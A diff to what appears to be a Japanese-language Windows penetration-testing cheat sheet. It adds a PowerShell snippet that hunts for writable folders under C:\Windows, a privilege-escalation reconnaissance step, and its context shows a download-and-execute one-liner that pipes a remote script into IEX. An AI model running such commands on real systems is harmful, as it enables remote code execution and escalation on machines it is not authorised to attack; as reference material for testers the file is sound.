@@ -5,6 +5,12 @@
 $wc=New-Object System.Net.WebClient; $wc.DownloadString("URL") | IEX;
 ```
 
+## 書き込み可能なフォルダ
+```
+$folders = Get-ChildItem -Path "C:\Windows" -Directory -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+foreach($folder in $folders) {icacls $folder | ForEach-Object { if((($_ -match "\(F\)") -or ($_ -match "\(M\)") -or ($_ -match "\(W\)")) -and (($_ -notmatch "Administrator") -and ($_ -notmatch "NT AUTHORITY\\") -and ($_ -notmatch "NT SERVICE\\") -and ($_ -notmatch "CREATOR OWNER") -and ($_ -notmatch "BUILTIN\\Backup Operators") -and ($_ -notmatch "RESTRICTED SERVICES\\"))) {$folder; $_} }}
+```
+
 ## ユーザ
 <details>
 <summary>ユーザの確認</summary>
